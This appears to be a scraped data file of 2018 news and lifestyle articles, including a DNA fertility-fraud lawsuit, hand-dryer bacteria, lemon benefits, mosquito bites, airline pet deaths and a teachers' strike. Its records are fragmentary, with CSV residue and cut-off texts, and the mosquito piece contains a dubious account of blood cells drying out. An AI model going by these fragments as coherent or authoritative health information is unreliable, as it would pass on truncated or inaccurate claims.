As reported by BBC News, an American woman who sent a DNA sample to genealogy site Ancestry.com back in 2017 was shocked to find out that the results suggested she wasn’t related to her father. Although she initially expected that this was an error – telling her now-divorced parents as much – it transpired that Kelli Rowlette was related to the doctor who delivered her at birth, 36 years ago.

Gizmodo notes that, upon receipt of the results of the ancestry test, Ms Rowlette was baffled by the inclusion of Gerald Mortimer, but she didn’t know who he was right off the bat. That was only revealed when she stumbled across her birth certificate, which included the name of the doctor that delivered her. Until this point, her parents kept their shock at the news to themselves.

Her lawsuit is now seeking to prosecute the Idaho Falls obstetrician gynecologist, with whom her mother and her supposed father, Sally Ashby and Howard Fowler, respectively, consulted prior to birth. He’s up for fraud, medical negligence, battery, emotional distress, and breach of contract.

The plaintiffs also name the Obstetrics and Gynecology Associates of Idaho Falls in the lawsuit, whose members, they claim, knew about Dr Mortimer’s behavior.

According to the lawsuit, the married couple had trouble conceiving, due to a low sperm count and a uterine condition. The Washington Post explains that she had a retroverted uterus, in which the uterus is angled spinewards. It’s unclear how this affects fertility, though.

Consequently, the couple decided to be artificially inseminated using sperm from both her husband (85 percent) and a donor (15 percent), who was requested to be a university student with fairly specific physical characteristics. The idea was that by doubling up the sperm donors, there would be a better chance of successful insemination, although the science surrounding this method shows decidedly mixed results.

In any case, it seems that at some point, Dr Mortimer used his own sperm instead, without the knowledge of the parents. Ms Rowlette was born in 1981, and later, the couple had a son without any additional medical assistance.

According to Courthouse News, the lawsuit mentions that Ms Ashby, Mr Fowler, and their two children eventually moved away from Idaho Falls to Washington State.

“Dr. Mortimer cried when Ms. Ashby informed him they were moving. Dr. Mortimer knew Kelli Rowlette was his biological daughter but did not disclose this to Ms. Ashby or Mr. Fowler,” the 14-page complaint noted.",Woman Makes Horrifying Discovery Through Ancestry DNA Test,

",11/04/2018 16:53,https://www.businessinsider.in/Scientists-compared-bathroom-hand-dryers-and-paper-towels-to-see-which-is-really-cleaner-and-the-winner-is-clear/articleshow/63718414.cms,"Advertisement

The air in a typical public restroom can be full of drug-resistant bacteria, and open-flush toilets help it fly up into the air.

Hand dryers can blow more potentially-pathogenic bathroom air around, and onto our hands, a new, independently-funded study shows.

One Connecticut health center is trading its hand dryers for paper towels, worried patients with compromised immune systems may be more at risk of catching something dangerous if they blow-dry their hands instead of wiping them dry.



Scientists have known for a while that bathroom air isn't exactly the most pristine stuff.

Public toilets can harbor handfuls of different drug-resistant strains of Staphylococcus, and scientists have also shown that restrooms are teeming with a wide variety of microbes, many from other people's pee, skin, and certain, ahem... body parts.

But when it comes to the question of whether to dry one's hands on a paper towel, or blow them dry under a hand dryer, scientists have struggled to find a definitive answer to which is better for your health. Until now.

A new, independently-funded study of 36 men's and women's bathrooms at the University of Connecticut School of Medicine found that bathroom hand dryers blow tons of bacterial spores around. Researchers holding up test plates to hand dryer air found as many as 60 different bacterial colonies could be blown onto them during a 30-second air dry. Turns out, even though the air coming out of hand dryers is almost perfectly clean, it ends up pushing more nasty bathroom air around than a paper towel.

Lead study author Peter Setlow says his research find is not a shock.

""The more air ya move? The more bacteria stick,"" he told Business Insider. ""And there are a lot of bacteria in bathrooms.""

In fact, other scientists have discovered that ""toilet plumes"" from inside the bowl of a toilet can spray aerosolized feces as high as 15 feet into the air. And blowing more of that pooey air with a dryer around could cause some serious harm, especially for vulnerable populations like the old and the sick.

Setlow himself, a septuagenarian researcher, says he's stopped using hand dryers altogether after completing his independently-funded study. And he's not the only one. The University of Connecticut School of Medicine where the study was done has also started stocking paper towels in all its facilities.

Still, the general public may not need to be so concerned with how they dry their hands, Setlow says.

""If I'm a person whose immune system is suppressed, I wanna minimize my exposure to bacteria,"" he says, stressing that his own tactic may be most important to keep in mind for seniors and people with compromised immune systems, people who might struggle bouncing back from being exposed to bacteria that, in a healthy person, might not do much harm.

The truth is that most bacteria aren't bad for us. Microbes are essential to life on Earth. They were some of the earliest life-forms, before us oxygen-sniffing creatures even set foot on the planet. Today, they're an essential part of our own immunity. They even interact with and, at times, control our genes, feeding our brains and our nervous system. One New York City geneticist even suggests new parents roll their kids on the floor of the grimy New York subway, because there's some evidence suggesting exposure to a wide array of crawly microbes early-on helps our immune systems grow up strong and healthy.

And besides, just because bathroom air is grosser than other air, doesn't mean you need to be more squeamish about popping a squat than you are about picking up a call. Microbiologists routinely argue that toilet seats are time and again tested and found to be much cleaner surfaces than our cell phones, office desks and restaurant menus.

Given that around 20% percent of us don't even bother to wash our hands at all after we do our business in a public restroom, hand drying may not be the most serious issue in the bathroom, anyway.

Regular, thorough handwashing, especially before eating and after using the washroom is still the number one way to ensure we stay healthy and illness-free, no matter how you may choose to dry off your mitts afterwards.

Nightstand - Organic Health

One of the most famous but not enough appreciated fruits are definitely lemons.
They contain an abundance of vitamin C, A, E and B6, but also calcium,

OURORGANICHEALTH.COM | BY OUR ORGANIC HEALTH
",10/04/2018 17:39,https://www.healthline.com/nutrition/6-lemon-health-benefits,"Lemons are high in vitamin C, fiber, and various beneficial plant compounds. These nutrients are responsible for several health benefits. In fact, lemons may support heart health, weight control, and digestive health. Here are 6 evidence-based health benefits of lemons. Share on Pinterest

1. Support Heart Health Lemons are a good source of vitamin C. One lemon provides about 31 mg of vitamin C, which is 51% of the reference daily intake (RDI). Research shows that eating fruits and vegetables rich in vitamin C reduces your risk of heart disease and stroke ( 1 , 2 , 3 ). However, it’s not only the vitamin C that is thought to be good for your heart. The fiber and plant compounds in lemons could also significantly lower some risk factors for heart disease ( 4 , 5 ). For instance, one study revealed that eating 24 grams of citrus fiber extract daily for a month reduced total blood cholesterol levels (6). Plant compounds found in lemons — namely hesperidin and diosmin — have also been found to lower cholesterol ( 7 , 8 , 9). SUMMARY

Lemons are high in heart-healthy vitamin C

and several beneficial plant compounds that may lower cholesterol.

2. Help Control Weight Lemons are often promoted as a weight loss food, and there are a few theories as to why this is. One common theory is that the soluble pectin fiber in them expands in your stomach, helping you feel full for longer. That said, not many people eat lemons whole. And because lemon juice contains no pectin, lemon juice drinks will not promote fullness in the same way. Another theory suggests that drinking hot water with lemon will help you lose weight. However, drinking water is known to temporarily increase the number of calories you burn, so it may be the water itself that is helping with weight loss — not the lemon ( 10 , 11 ). Other theories suggest that the plant compounds in lemons may aid weight loss. Research shows that plant compounds in lemon extracts may help prevent or reduce weight gain in a number of ways ( 12 , 13 ). In one study, mice on a fattening diet were given lemon polyphenols extracted from the peel. They gained less weight and body fat than other mice ( 14 ). However, no studies confirm the weight loss effects of lemon compounds in humans. SUMMARY

Animal studies show that lemon extract and

plant compounds may promote weight loss, but the effects in humans are unknown.

3. Prevent Kidney Stones Kidney stones are small lumps that form when waste products crystallize and build up in your kidneys. They are quite common, and people who get them often get them repeatedly. Citric acid may help prevent kidney stones by increasing urine volume and increasing urine pH, creating a less favorable environment for kidney stone formation ( 15 , 16 ). Just a 1/2-cup (4 ounces or 125 ml) of lemon juice per day may provide enough citric acid to help prevent stone formation in people who have already had them ( 17 , 18 ). Some studies also found that lemonade effectively prevented kidney stones, but the results have been mixed. Other studies have shown no effect ( 19 , 20 , 21 , 22 ). Therefore, more well-conducted studies need to examine whether lemon juice affects kidney stone formation ( 23 , 24 , 25 ). SUMMARY

Lemon juice may help prevent

kidney stones. However, more quality research is needed.

4. Protect Against Anemia Iron deficiency anemia is quite common. It occurs when you don’t get enough iron from the foods you eat. Lemons contain some iron, but they primarily prevent anemia by improving your absorption of iron from plant foods ( 26 , 27 ). Your gut absorbs iron from meat, chicken, and fish (known as heme iron) very easily, while iron from plant sources (non-heme iron) not as easily. However, this absorption can be improved by consuming vitamin C and citric acid. Because lemons contain both vitamin C and citric acid, they may protect against anemia by ensuring that you absorb as much iron as possible from your diet. SUMMARY

Lemons contain vitamin C and

citric acid, which help you absorb non-heme iron from plants. This may prevent

anemia.

5. Reduce Cancer Risk A healthy diet rich in fruits and vegetables may help prevent some cancers ( 28 ). Some observational studies have found that people who eat the most citrus fruit have a lower risk of cancer, while other studies have found no effects ( 29 , 30 , 31 ). In test-tube studies, many compounds from lemons have killed cancer cells. However, they may not have the same effect on the human body ( 32 , 33 , 34 ). Some researchers think that plant compounds found in lemons — such as limonene and naringenin — could have anticancer effects, but this hypothesis needs further investigation ( 5 , 35 , 36 , 37 ). Animal studies indicate that D-limonene, a compound found in lemon oil, does have anticancer properties ( 38 , 39 ). Another study used pulp from mandarins that contained the plant compounds beta-cryptoxanthin and hesperidin, which are also found in lemons. The study discovered that these compounds prevented malignant tumors from developing in the tongues, lungs, and colons of rodents ( 40 ). However, it should be noted that the research team used a very high dose of the chemicals — far more than you would get by eating lemons or oranges. While some plant compounds from lemons and other citrus fruits may have anticancer potential, no quality evidence suggests that lemons can fight cancer in humans. SUMMARY

Some plant chemicals found in

lemons have been shown to prevent cancer in animal studies. However, human

studies are needed.

6. Improve Digestive Health Lemons are made up of about 10% carbs, mostly in the form of soluble fiber and simple sugars. The main fiber in lemons is pectin, a form of soluble fiber linked to multiple health benefits. Soluble fiber can improve gut health and slow the digestion of sugars and starches. These effects may result in reduced blood sugar levels ( 41 , 42 , 43 , 44 ). However, to get the benefits of fiber from lemons, you need to eat the pulp. People who drink lemon juice, without the fiber found in the pulp, will miss out on the benefits of the fiber. SUMMARY The soluble fiber in lemons could help improve digestive

health. However,

you need to eat the pulp of the lemon, not just the juice.",6 Evidence-Based Health Benefits of Lemons,

",8/04/2018 21:07,https://www.sciencealert.com/here-s-the-best-way-to-stop-a-mosquito-bite-from-itching,"For many of us, mozzie bites are an unavoidable part of life if we want the luxury of having our balcony door open on a summer's night or evening drinks on the harbour.

But apart from not scratching them at all - and come on now, let's not get too crazy - what's the most effective way of minimising the itch?

The key is in how our immune system responds to a mosquito bite in the first place.

When you're bitten, a mosquito will use its sharp, tubular proboscis to deliver saliva that's full of anticoagulants to the blood, which thins it out for quick and easy siphoning.

As researchers discovered back in 2012, these mouthparts are so small, they actually pierce individual blood cells and suck them dry.

The first ever time you get bitten by a mosquito in your life, you won't feel a thing, because your immune system hasn't had a chance to develop a coordinated response.

But once it does, it will know to deliver an unrelenting burst of histamines to the dried-up, shrunken blood cells, and these are what turns the bite wound into a red, swollen, and itchy disaster area.

This is one of those cases where your immune system ends up causing more harm than good, so the best solution to combat a histamine-related itch is to douse it in antihistamines, as Rebecca Harrington explains over at Business Insider:

""If the itch is too much to bear, apply an antihistamine cream or gel to the area, or take an antihistamine pill, recommends the US Food and Drug Administration. Look for ""Diphenhydramine"" in the ingredients list - Benadryl has it. Both the cream and the pills can be found over the counter and are pretty inexpensive.""

Those pills can even be taken as a precaution beforehand, to deal with the inflammation as soon as you are bitten.

While antihistamines are the most widely accepted treatment for mosquito bites, there have been questions over just how effective they are.

In 2012, a study published in the Drug and Therapeutics Bulletin reviewed the available evidence for how over-the-counter treatments dealt with the itch of bug bites, and found ""little direct evidence for the efficacy of treatments for simple insect bites, and, in general, recommendations for treatment are based on expert opinion and clinical experience.""

They added that with ointments containing antiseptics, antihistamines, or numbing agents such as lidocaine and benzocaine only appeared to help ""sometimes"".

That said, ""sometimes"" is better than nothing, the researchers concluded, and having reviewed all available options, came to this recommendation:

""For mild local reactions, the area should be cleaned and a cold compress applied. Oral analgesics can be given for pain, and a mild corticosteroid cream applied to reduce inflammation and itching. Large local reactions can be treated with an oral antihistamine. Non-sedating antihistamines are preferred during the day, but a sedating antihistamine can be of use at night if sleep is disturbed. Antibacterial treatment is not required for simple insect bites, but secondary infections should be treated with an oral antibacterial agent in accordance with local guidelines.""

And here's some rather confronting footage of a mosquito's flexible proboscis probing a blood cell. Know your enemy, I say.

605,Because they instinctually want to follow their family. ,"This is why dogs follow you into the bathroom. I never
knew this!

Dogs have their own special form of communication.

NEWS.ANIMALCHANNEL.CO | BY PAW MY HEART
",8/04/2018 15:50,https://be.chewy.com/is-this-normal-why-do-dogs-follow-you-into-the-bathroom/,"Much like parents of human children, all pet parents know that having a dog means you rarely go to the bathroom alone. For some strange reason, dogs love to follow us to the porcelain palace, where they sustain the most uncomfortable kind of eye contact ever. (Well, maybe the second most-uncomfortable, right behind that time you accidentally locked eyes with your mother while you all watched “Superbad.”)

That’s certainly the case for dog mom Leigh, a Pittsburgh, Pennsylvania-based marketing and PR professional whose roughly 10-year-old rescue Chihuahua, El Vez, has been following her into the bathroom ever since she first brought him home.

“We have excellent conversations and brainstorming in the bathroom,” she says.

The morning chats are nice and all, but why do dogs follow you into the bathroom, taking a seat right beside the toilet every time we do our business? It's apparently not because they're returning the favor, after watching us stand beside them while they do their own thing outside.

In fact, it’s kind of our fault.

“We’ve bred them for hundreds of years, if not thousands, to want to be near us,” says Kayla Fratt, an International Association of Animal Behavior Consultants (IAABC)-certified dog behavior consultant and the owner of Journey Dog Training in Missoula, Montana. ""It absolutely makes sense for them to follow us from room to room, and there’s no real reason for them not to follow us into the bathroom.""

So, it’s not because they’re being little creeps who like to watch us poop. Actually, Fratt says there's ""no indication"" that they even know what a bathroom is—or what we're doing in there.

""Even if they 'know' what you’re doing, why would it matter to them?"" she says. ""It’s certainly reading too much into things to assume that your dog is being gross or weird. He just wants to be near you. It’s really that simple.""

The same goes for whether they’re watching us relieve ourselves or take a shower or do our makeup. The fact that SO MANY DIFFERENT THINGS can happen in the bathroom just might be part of the reason why our dogs are so curious about it.

""Sometimes you go in there for a minute or two, and sometimes when you take a bath, it might be for an hour,"" says Paul Sheinberg, CPDT-KA, founder and primary dog trainer of Pawsitive Paul's Dog Training in Baltimore, Maryland. ""Because of that uncertainty, dogs tend to follow you when you’re going toward that direction, if you have that type of dog that sticks by you or gets nervous when you leave.""

On the flip side, if your dog doesn't follow you into the bathroom (or anywhere else in the house), that doesn't mean there's anything wrong with them—or with you.

""Some dogs are just more Velcro-y than others. They follow and shadow their people more,"" Fratt says. “It’s more common in some shepherding breeds than in some more aloof breeds, but it’s not abnormal dog behavior at all.""

If you'd prefer to have a few minutes to yourself, it's not difficult to train your dog to let you walk down the hall and into the bathroom without them.

""By far, the easiest way is to teach them a basic ‘stay’ and when you’re done with your business, give them a treat or some praise for being so brave on their own,"" Sheinberg says. She suggests teaching the stay command without the use of the bathroom, first, just to get your dog used to it. Then, once they’ve mastered the command, transition to the bathroom area for small durations throughout the day to practice. “It should be rectified in a positive and fun way within days.""

So, there you have it. It’s perfectly normal for dogs to follow you into the bathroom—and perfectly normal if they don’t. The only cause for concern would be if your dog gets seriously anxious about being alone while you’re in the bathroom, even for a few minutes. It could be a sign of separation anxiety in dogs.

""If not following you into the bathroom makes your dog distressed, it’s time to get help,"" Fratt advises. She suggests calling a certified dog behavior consultant or another behavior expert—rather than an obedience trainer—to work through the issue.

Back in Pittsburgh, Leigh says El Vez has actually been giving her a little more space lately. ""I will say, since quarantine, I've noticed that it's happening less and less,"" she says. ""He actually seems to be actively trying to find time to socially distance himself from us humans.""",Why Do Dogs Follow You Into the Bathroom?,

10 Habits Of Incredibly Happy People

We’re always chasing something—be it a promotion, a new car, or a significant other. This leads to the belief that, “When (blank) happens, I’ll finally be happy.”

While these major events do make us happy at first, research shows this happiness doesn’t last. A study from Northwestern University measured the happiness levels of regular people against those who had won large lottery prizes the year prior. The researchers were surprised to discover that the happiness ratings of both groups were practically identical.

The mistaken notion that major life events dictate your happiness and sadness is so prevalent that psychologists have a name for it: impact bias. The reality is, event-based happiness is fleeting.

Happiness is synthetic—you either create it, or you don’t. Happiness that lasts is earned through your habits. Supremely happy people have honed habits that maintain their happiness day in, day out. Try out their habits, and see what they do for you:

1. They slow down to appreciate life’s little pleasures. By nature, we fall into routines. In some ways, this is a good thing. It saves precious brainpower and creates comfort. However, sometimes you get so caught up in your routine that you fail to appreciate the little things in life. Happy people know how important it is to savor the taste of their meal, revel in the amazing conversation they just had, or even just step outside to take a deep breath of fresh air.

2. They exercise. Getting your body moving for as little as 10 minutes releases GABA, a neurotransmitter that makes your brain feel soothed and keeps you in control of your impulses. Happy people schedule regular exercise and follow through on it because they know it pays huge dividends for their mood.

3. They spend money on other people. Research shows that spending money on other people makes you much happier than spending it on yourself. This is especially true of small things that demonstrate effort, such as going out of your way to buy your friend a book that you know they will like.

4. They surround themselves with the right people. Happiness spreads through people. Surrounding yourself with happy people builds confidence, stimulates creativity, and it’s flat-out fun. Hanging around negative people has the opposite effect. They want people to join their pity party so that they can feel better about themselves. Think of it this way: If a person were smoking, would you sit there all afternoon inhaling the second-hand smoke? You’d distance yourself, and you should do the same with negative people.

5. They stay positive. Bad things happen to everyone, including happy people. Instead of complaining about how things could have been or should have been, happy people reflect on everything they’re grateful for. Then they find the best solution available to the problem, tackle it, and move on. Nothing fuels unhappiness quite like pessimism. The problem with a pessimistic attitude, apart from the damage it does to your mood, is that it becomes a self-fulfilling prophecy: if you expect bad things, you’re more likely to experience negative events. Pessimistic thoughts are hard to shake off until you recognize how illogical they are. Force yourself to look at the facts, and you’ll see that things are not nearly as bad as they seem.

6. They get enough sleep. I’ve beaten this one to death over the years and can’t say enough about the importance of sleep to improving your mood, focus, and self-control. When you sleep, your brain literally recharges, removing toxic proteins that accumulate during the day as byproducts of normal neuronal activity. This ensures that you wake up alert and clear-headed. Your energy, attention, and memory are all reduced when you don’t get enough quality sleep. Sleep deprivation also raises stress hormone levels on its own, even without a stressor present. Happy people make sleep a priority, because it makes them feel great and they know how lousy they feel when they’re sleep deprived.

7. They have deep conversations. Happy people know that happiness and substance go hand-in-hand. They avoid gossip, small talk, and judging others. Instead they focus on meaningful interactions. They engage with other people on a deeper level, because they know that doing so feels good, builds an emotional connection, and is an interesting way to learn.

8. They help others. Taking the time to help people not only makes them happy, but it also makes you happy. Helping other people gives you a surge of oxytocin, serotonin, and dopamine, all of which create good feelings. In a Harvard study, employees who helped others were 10 times more likely to be focused at work and 40% more likely to get a promotion. The same study showed that people who consistently provided social support were the most likely to be happy during times of high stress. As long as you make certain that you aren’t over committing yourself, helping others is sure to have a positive influence on your mood.

9. They make an effort to be happy. No one wakes up feeling happy every day and supremely happy people are no exception. They just work at it harder than everyone else. They know how easy it is to get sucked into a routine where you don’t monitor your emotions or actively try to be happy and positive. Happy people constantly evaluate their moods and make decisions with their happiness in mind.

10. They have a growth mindset. People’s core attitudes fall into one of two categories: a fixed mindset or a growth mindset. With a fixed mindset, you believe you are who you are and you cannot change. This creates problems when you’re challenged, because anything that appears to be more than you can handle is bound to make you feel hopeless and overwhelmed. People with a growth mindset believe that they can improve with effort. This makes them happier because they are better at handling difficulties. They also outperform those with a fixed mindset because they embrace challenges, treating them as opportunities to learn something new.

Bringing It All Together

Happiness can be tough to maintain, but investing in the right habits pays off. Adopting even a few of the habits from this list will make a big difference in your mood.

Some French baguette sellers are describing it as ‘fake news’, but recent statistics show that the burger is outselling the traditional ham baguette. Zut alors! Is it true?

France has fallen in love with burgers

No matter which French city you are in, it is now much easier to find a hamburger than ever before. What used to be a niche food, reserved for fast food American outlets, has undoubtedly become mainstream. While the French used to be a bit snooty about American food, they have made the burger their own – go to any major town in France and you’ll trip over home-made burger restaurants selling top-notch meat in achingly hip buns. It is said that 85% of French restaurants now serve burgers à la carte.

Gira Conseil, the company which conducted research into French lunchtime eating habits, said that it interviewed over 1,000 bars and restaurants across France and discovered that the burger is currently outselling the ham baguette. Last year, France ate over 1.4 billion burgers, compared to 1.2 billion ham baguettes. The consultancy firm confirmed that the last three years have witnessed an explosion in the demand for burgers in France.

Recently, Grace Goldstein opened the bag of greens, only to find a dead lizard mixed in with the kale leaves. The bag of ""cut, cleaned and ready to cook"" kale was bought from a DC store. Her friend shared a photo of the discovery to Twitter, where it's been terrifying internet users around the globe.

Trader Joe's is reportedly investigating the complaint. In the meantime, however, Goldstein is going to stick to ""spinach.""

POLYGON.COM

",6/04/2018 13:55,https://www.polygon.com/2018/4/4/17200010/avengers-infinity-war-captain-america-butt-poster,"Marvel Entertainment released a veritable blitz of character posters for Avengers: Infinity War today, 22 in all, but there’s only one that’s taken Twitter by storm.

It’s the poster for Chris Evans’ Captain America, featuring the superhero in three-quarters profile with his back to the camera, a Wakandan shield strapped to his arm. But the attention isn’t on Evans’ beautiful blue peepers — though they do pop quite nicely from the dark tones of the poster, don’t they?

No, it’s all about another of his considerable ... assets.

The effect of the poster may have been enhanced slightly by the way Twitter algorithmically crops its thumbnail images to be weighted toward text, which makes the whole situation a little difficult to ignore.

In the replies to Evans’ own tweet of the poster, which is cropped in the same way when it appears in the main Twitter timeline, the response is strong and consistent:

OF COURSE Captain America's butt has to be on the poster. The sexualization of our star-spangled hero has become outright disgusting... LMAO who am I kidding my guy @ChrisEvans is killing that pose, I ain't even mad ‍♂️ https://t.co/MxPX9lS71T — chamo (@jcaruci_) April 4, 2018

For other users, there was a bit of a victory in equal butt-rights in the poster. The three-quarters pose, shot from behind, is a common trope of action movie posters — at least when it comes to female leads. This Captain America poster isn’t the first time the butt-pose trope has been flipped to use with a male lead, but it’s still a notable exception to the rule.

614,"United accepts higher-risk, short-nosed dog breeds that other airlines don't. ","More dogs die on United than on any other airline.
Here’s why.

United's disproportionately high number of pet deaths could be attributed in part to
the types of dogs it accommodates, compared with other airlines.

WASHINGTONPOST.COM | BY MARTINE POWERS
",5/04/2018 18:29,https://www.washingtonpost.com/news/dr-gridlock/wp/2018/04/04/more-dogs-die-on-united-than-on-any-other-airline-heres-why/,"Of the 506,994 animals that flew on U.S. commercial air carriers last year, 24 died in transit. And 18 of those deaths — 75 percent — occurred on United Airlines.

Turns out that not only does #United kill puppies because of poorly educated stewardesses, but 18 of the 24 dogs that died on planes last year were on United planes. If you are a dog lover, avoid #United. — Tom Eggert (@madisonthom) March 14, 2018

For context, United transports more animals in the United States than any other airline: Last year, the airline transported about 27 percent of all animals flown as air cargo. Even so, people saw these disproportionately high numbers from 2017 as evidence that United has a history of mistreating animals, and that the airline is inherently less safe for transporting animals than any other major U.S. carrier.

Story continues below advertisement

And United’s steep numbers aren’t new. Going back further, United also reported the highest numbers of animal deaths in 2015 and 2016, especially when compared with other major U.S. carriers such as Delta and American. (Spirit, Southwest, JetBlue and Virgin America do not transport animals on their planes as cargo, though some small pets are allowed as carry-ons.)

But it turns out that United’s sky-high numbers of recent pet deaths may be more complicated than they appear at first glance.

While United does carry a disproportionate number of the animals who die on planes, the airline says the disparity results from one simple variable: United accepts higher-risk dog breeds that other major U.S. carriers do not allow.

These types of dogs are known as brachycephalic, or “short-nosed” or “snub-nosed,” breeds. Their airways are more compact, which tends to lead to respiratory issues. The short-nosed breeds include bulldogs, boxers, pugs, Boston terriers, Pekingese, mastiffs, shih tzus and others.

Story continues below advertisement

For years, American and Delta have refused to ship these types of dogs, arguing that the risk of death or injury (and liability to the airline) was too high.

Up until last month, United continued to accept “snub-nosed” breeds for cargo shipments.

The airline’s rationale: For people who needed to travel with a boxer or a bulldog, United was often the only way their dog could travel by air. United says they consistently alerted customers to the heightened danger of putting their higher-risk dog on a plane. But ultimately, they say, airline representatives left it to customers to decide whether their pet could handle the trip.

That explanation for the disparity is borne out, at least somewhat, by data on animal deaths that is kept by the U.S. Transportation Department.

Story continues below advertisement

We looked at the recorded animal deaths from 2015 to 2017. In those three years, 85 animals died while in the care of a U.S. air carrier. Of those deaths, 41 occurred on United.

Advertisement

Nearly 40 percent of those deaths occurred to a dog that was identified as a higher-risk breed — a breed that is barred on American or Delta Air Lines. In many of those cases, post-mortem examinations of the animal led the airline to conclude that there was nothing they could have done to prevent the animal’s death.

The deaths of these higher-risk dogs made up half of all dog deaths; there were also a handful of cats, reptiles and birds that died while in United’s care during those three years.

Story continues below advertisement

Of the three largest airlines that accommodate animals — United, Delta and American — the type of dog that died most frequently from 2015 to 2017 was the American bully, a breed known for its big jowls and squashed nose.

Five of the six American bully deaths occurred on United because the dog is banned by Delta and American Airlines. (Apparently, Delta made an exception for one such dog in 2015; that dog died en route from Savannah, Ga., to Atlanta, the first leg of a longer trip.)

Advertisement

Of the nine dog breeds with the highest incidence of death on these three major airlines, four are brachycephalic breeds that are allowed only on United.

So, why not ban those breeds altogether?

Story continues below advertisement

That’s something that United may consider. The airline has temporarily suspended its animal shipping program, at least until May, as company officials conduct a top-to-bottom assessment of its own animal cargo practices.

They may decide that those animals are too high-risk and that the financial opportunity cornering the market on transporting America’s population of pugs and bulldogs may not worth the legal liability.

Still, an all-out ban could be onerous for the owners.

Charles Hobart, a spokesman for United, pointed out that United accommodates 3,000 pet-owning military families per year. When those families own a brachycephalic dog, and they are reassigned to an overseas military posting, United is sometimes their only means to ship their pet. Otherwise, they would have to give their dog away.

Story continues below advertisement

“Our goal is to help keep families together, and dogs are part of the family,” Hobart said. “A lot of times, families just don’t have an option.”

Kitty Block, acting president and chief executive of the Humane Society of the United States, said that’s no excuse for the higher rate of death on United’s flights. She doesn’t want to see an all-out ban on the snub-nosed dogs, she said. Instead, she wants United to find ways to accommodate the special needs of those high-risk breeds.

“The fact is that while there is some risk with traveling with a brachycephalic breed on a plane, traveling with them in the cabin can be done safely if the right measures are taken by both the owner and the airline,” Block said. “And that is what we’re asking for — that airlines take steps to reduce the risk of flying with pets, regardless of breed, as much as possible.”

In the meantime, Hobart said, United is taking other steps to improve the quality of service for people transporting their pets by air — particularly in light of another high-profile incident, in which a German shepherd was accidentally sent to Japan instead of its intended destination of Kansas City, Mo.

The Kansas-bound German shepherd that United Airlines mistakenly shipped to Japan reunited with its family on March 15. (Kara Swindle)

Hobart said the company has instituted new procedures to ensure that animals are loaded onto the correct airplane and that animals are not accidentally left behind or sent to the wrong destination.

From now on, Hobart said, “a member of management will be on the ramp to confirm that the loading and offloading is taking place in compliance with the planned route of flight and manifest.” The new procedures require another manager to follow up with the data provided by the ramp supervisor “to cross-check and verify before an animal can be released for departure,” he said.

Additionally, United will now automatically send daily reports to airport managers around the country, alerting them about what animals to expect to arrive and depart from their airport.",More dogs die on United than on any other airline. Here’s why.,

Why are teachers striking? The answer may surprise you

advocates to tell the truth about real increases in taxpayer resources and where
they've been spent.

",4/04/2018 19:33,https://www.nytimes.com/2018/03/06/us/west-virginia-teachers-strike-deal.html,"“It appears the strike will end,” Mr. Lee said after the deal was announced.

The pay raise was the main point of contention in the final days of the strike, but the teachers have also demanded some relief from sharply rising health insurance costs. The governor has promised to address that issue through a state task force. Both union leaders and rank-and-file teachers have welcomed that move.

“I think it’s a step in the right direction,” said Kerry Guerini, a teacher from Fayette County, who stood in the Capitol on Tuesday with a sign that said, “Will teach for insurance.”

“A 5 percent raise isn’t going to feel like very much when we have so much coming out for insurance,” Ms. Guerini said. Nevertheless, she added, “I’m ready to go back.”

Mr. Carmichael, whose resistance to the raises had made him a key antagonist for the striking teachers, insisted on Tuesday that he did not want to pass anything “just to appease a special-interest group.” The deal came about, he said, because lawmakers decided to offset the cost of the raises with budget cuts, rather than rely on optimistic revenue estimates the governor had offered.

The raises for state workers were expected to cost the state treasury a total of about $110 million a year. Some of the money for the raises would be redirected from amounts the governor had requested for tourism promotion and the state Department of Commerce, but lawmakers in the Senate said additional spending cuts would probably be required. Mr. Blair, the Republican who heads the Senate’s Finance Committee, said in a meeting that some of the money could be taken from Medicaid.

Mr. Carmichael told reporters that the scale of Medicaid cuts was “not absolutely determined,” because lawmakers were still “scouring the budget” for more places to cut.",West Virginia Raises Teachers’ Pay to End Statewide Strike,

Research shows that 74 percent of millennial women think hair shown in ads is unachievable. Turns out, it’s sad but true. “We know hair-care brands often use exaggerated claims and show some ridiculous situations in their ads and we can admit, Suave has had its own share of fancy hair flips in the past,” Jennifer Bremner, director of marketing for Suave, tells Allure. “But we also know that we don’t need to rely on advertising tricks and decided to have some fun while showing women everywhere how crazy those practices look when you really see it up close.”

So, Suave created a video to show just how ridiculous and unrealistic some of these commercials are. The video starts off with a model against a green screen with rods — yes, rods — going through her hair to make it appear flowy and wind-blown. Next, another model is shown laying down with seemingly long perfect waves, but when she gets up, you can see the hair extensions glued to the platform. And as for the volume?

Most people would think if it's not good looks that make a man most attractive to women, then it's definitely a sense of humor.

But studies consistently show that altruism is a top quality women are drawn to when they are looking for a relationship.

And a new study in the British Journal of Psychology found altruistic men may have more sex, too.

The researchers asked unmarried Canadian adults how much they did good deeds like giving money to charity, or helping someone get their car out of the snow. They then asked the participants how often they had sex and how many partners they've had.

Men who reported more altruistic acts had more sex - and more partners. For those who were in relationships, good-hearted men were more likely to have had more sex in the last 30 days, too.

Advertisement

In the second experiment of the study, the researchers had undergraduate students say whether they would like to donate money they might receive for participating to charity. Those who said they would also tended to have more casual sex, more sex in relationships, and more lifetime sex partners overall.

Another study, published in January 2016 in the journal Evolutionary Psychology, presented 202 women with different men to choose from. The different combinations of choices were either attractive or not, and they either did a good deed or didn't.

The women chose the selfish, attractive men for a one-night stand. But for a long-term relationship, they chose the altruistic man whether he was attractive or not.

A slightly older study, published in The Journal of Social Psychology in 2013, really drives this home. That study found that women valued altruism above other traits as a measure of whether a potential mate would make a good parent. The women also said that altruism was important for short-term relationships, but significantly more women said the trait mattered for the long-term.

Yet another study, published in Social Psychological and Personality Science in July 2015, analyzed Germans' responses to a large annual survey.

Advertisement

Single people who reported doing good deeds were much more likely to say they were in a relationship the next year. They also took less time to find a partner than their non-altruistic peers.

All of this is not to say other traits don't matter. Humor is also important to women selecting a mate, researchers have found. It makes women assume a man is more intelligent.

A sense of humor is a good indicator of sexual activity, too. In one study, men who women rated as funnier reported having more sex with more partners.

For building long-term relationships, though, researchers find over and over again that altruism is a crucial and highly desirable trait.

Psychologists have yet to pit humor head-to-head against altruism. It's also important to keep in mind that many of these studies are small, and that people often behave differently in real life than they do in a lab setting, or when responding to a survey. Especially when reporting positive experiences like charity work or sex, men may be more likely to overestimate how much they actually do those things. And due to the way these kinds of studies are designed, they can't say conclusively that it's altruism specifically that's attractive; it might be other traits associated with altruism, or that men attractive for other reasons might also happen to be altruistic.

